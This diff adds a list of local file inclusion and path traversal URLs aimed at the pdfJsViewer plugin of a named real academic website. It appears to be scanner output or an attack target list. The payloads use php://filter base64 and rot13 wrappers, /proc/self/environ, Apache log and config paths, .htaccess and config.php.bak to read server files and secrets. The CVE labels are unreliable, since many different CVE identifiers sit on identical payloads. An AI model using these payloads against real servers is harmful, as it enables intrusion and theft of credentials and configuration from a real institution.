@@ -1,0 +1,21 @@
+http://infokripto.poltekssn.ac.id/plugins/generic/pdfJsViewer/pdf.js/web/viewer.html?file=/index.php?page=php://filter/convert.base64-encode/resource=index.php, CVE-2019-11043 
+http://infokripto.poltekssn.ac.id/plugins/generic/pdfJsViewer/pdf.js/web/viewer.html?file=php://filter/read=string.rot13/resource=index.php, Wrapper-php 
+http://infokripto.poltekssn.ac.id/plugins/generic/pdfJsViewer/pdf.js/web/viewer.html?file=php://filter/convert.base64-encode/resource=index.php, Wrapper-php-3 
+http://infokripto.poltekssn.ac.id/plugins/generic/pdfJsViewer/pdf.js/web/viewer.html?file=pHp://FilTer/convert.base64-encode/resource=index.php, Wrapper-php-4 
+http://infokripto.poltekssn.ac.id/plugins/generic/pdfJsViewer/pdf.js/web/viewer.html?file=../../../proc/self/environ, RCE 
+http://infokripto.poltekssn.ac.id/plugins/generic/pdfJsViewer/pdf.js/web/viewer.html?file=/index.php?page=php://filter/read=string.rot13/resource=index.php, LFI-Index-6 
+http://infokripto.poltekssn.ac.id/plugins/generic/pdfJsViewer/pdf.js/web/viewer.html?file=/index.php?page=php://filter/convert.base64-encode/resource=index.php, LFI-Index-7 
+http://infokripto.poltekssn.ac.id/plugins/generic/pdfJsViewer/pdf.js/web/viewer.html?file=/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php, LFI-Index-8 
+http://infokripto.poltekssn.ac.id/plugins/generic/pdfJsViewer/pdf.js/web/viewer.html?file=/var/log/httpd/access_log, Apache-1 
+http://infokripto.poltekssn.ac.id/plugins/generic/pdfJsViewer/pdf.js/web/viewer.html?file=/usr/local/etc/apache2/httpd.conf, Apache-2 
+http://infokripto.poltekssn.ac.id/plugins/generic/pdfJsViewer/pdf.js/web/viewer.html?file=../../../.htaccess, DIR-PATHSAL-22 
+http://infokripto.poltekssn.ac.id/plugins/generic/pdfJsViewer/pdf.js/web/viewer.html?file=../../config.php.bak, Remote File Disclosure 
+http://infokripto.poltekssn.ac.id/plugins/generic/pdfJsViewer/pdf.js/web/viewer.html?file=/index.php?page=php://filter/convert.base64-encode/resource=index.php, CVE-2024-0001 
+http://infokripto.poltekssn.ac.id/plugins/generic/pdfJsViewer/pdf.js/web/viewer.html?file=/index.php?page=php://filter/convert.base64-encode/resource=index.php, CVE-2024-0019 
+http://infokripto.poltekssn.ac.id/plugins/generic/pdfJsViewer/pdf.js/web/viewer.html?file=/index.php?page=php://filter/convert.base64-encode/resource=index.php, CVE-2024-0037 
+http://infokripto.poltekssn.ac.id/plugins/generic/pdfJsViewer/pdf.js/web/viewer.html?file=/index.php?page=php://filter/convert.base64-encode/resource=index.php, CVE-2024-0055 
+http://infokripto.poltekssn.ac.id/plugins/generic/pdfJsViewer/pdf.js/web/viewer.html?file=/index.php?page=php://filter/convert.base64-encode/resource=index.php, CVE-2024-0073 
+http://infokripto.poltekssn.ac.id/plugins/generic/pdfJsViewer/pdf.js/web/viewer.html?file=/index.php?page=php://filter/convert.base64-encode/resource=index.php, CVE-2024-0091 
+http://infokripto.poltekssn.ac.id/plugins/generic/pdfJsViewer/pdf.js/web/viewer.html?file=/index.php?page=php://filter/convert.base64-encode/resource=index.php, CVE-2024-0109 
+http://infokripto.poltekssn.ac.id/plugins/generic/pdfJsViewer/pdf.js/web/viewer.html?file=/index.php?page=php://filter/convert.base64-encode/resource=index.php, CVE-2024-0127 
+http://infokripto.poltekssn.ac.id/plugins/generic/pdfJsViewer/pdf.js/web/viewer.html?file=/index.php?page=php://filter/convert.base64-encode/resource=index.php, CVE-2024-0145 
